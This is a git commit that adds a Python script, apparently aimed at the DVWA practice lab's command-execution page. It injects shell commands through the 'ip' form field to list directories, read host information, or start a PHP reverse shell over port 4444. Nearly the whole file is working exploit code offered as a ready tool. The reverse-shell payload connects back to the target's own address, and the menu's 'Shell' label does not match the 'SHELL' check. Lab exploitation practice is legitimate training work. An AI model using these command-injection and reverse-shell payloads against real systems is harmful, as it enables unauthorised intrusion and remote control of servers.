a457b2f0bbbcc29eb4d837b669a39662c1d6b427
SpazTBC <32847672+SpazTBC@users.noreply.github.com>
2024-04-17 02:35:10 +0000

    Add files via upload

---
+++ execution.py
@@ -0,0 +1,85 @@
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://192.168.12.162/vulnerabilities/exec/"  # URL Here
+
+# Include your headers
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Referer": "http://192.168.12.162/vulnerabilities/exec/",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://192.168.12.162",
+    "DNT": "1",
+    "Connection": "close",
+    "Cookie": "security=low; PHPSESSID=ge2i5ou0n58jrdsgl2gkc1u6p0; security=low",
+    "Upgrade-Insecure-Requests": "1"
+}
+
+print("Options: Shell, DL (This is Directory Listing), HI (Host Information)")
+
+u_input = input("What Would You Like To Do? ")
+
+if u_input == "DL":
+    payload = "127.0.0.1 && ls -la"
+    
+    data = {"ip": payload, "Submit": "Submit"}
+
+    # Make the POST request
+    response = requests.post(url, data=data, headers=headers)
+    
+    # Parse the response HTML
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Find the <pre> tag
+    pre_tag = soup.find('pre')
+    
+    if pre_tag:
+        print("Found the <pre> tag:")
+        print(pre_tag.text)
+    else:
+        print("No <pre> tag found in the response.")
+
+
+if u_input == "HI":
+    payload = "127.0.0.1 && uname -a"
+    
+    data = {"ip": payload, "Submit": "Submit"}
+
+    # Make the POST request
+    response = requests.post(url, data=data, headers=headers)
+    
+    # Parse the response HTML
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Find the <pre> tag
+    pre_tag = soup.find('pre')
+    
+    if pre_tag:
+        print("Found the <pre> tag:")
+        print(pre_tag.text)
+    else:
+        print("No <pre> tag found in the response.")
+
+
+if u_input == "SHELL":
+    payload = "127.0.0.1 && php -r '$sock=fsockopen(\"192.168.12.162\",4444);`/bin/sh <&3 >&3 2>&3`;'"
+
+    data = {"ip": payload, "Submit": "Submit"}
+
+    # Make the POST request
+    response = requests.post(url, data=data, headers=headers)
+
+    # Parse the response HTML
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    # Find the <pre> tag
+    pre_tag = soup.find('pre')
+
+    if pre_tag:
+        print("Found the <pre> tag:")
+        print(pre_tag.text)
+    else:
+        print("No <pre> tag found in the response.")
